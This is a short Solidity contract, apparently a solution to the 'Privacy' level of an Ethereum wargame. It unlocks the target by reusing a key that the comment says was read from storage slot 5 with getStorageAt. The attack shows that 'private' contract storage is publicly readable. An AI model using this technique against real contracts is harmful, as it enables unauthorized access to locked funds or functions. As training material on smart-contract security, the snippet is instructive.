      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}

contract AttackPrivacy {

    Privacy toAttack;
    //retrieved from web3.eth.getStorageAt(contract.address,5)
    bytes32 private key = 0x6577620b30b0ef09df566e1398159276111f6f09ed7f3a6ffa25ef54f6b098e3;

    constructor(address _levelInstance) public {
        toAttack = Privacy(_levelInstance);
    }

    function attack() public {
        toAttack.unlock(bytes16(key));
    }
}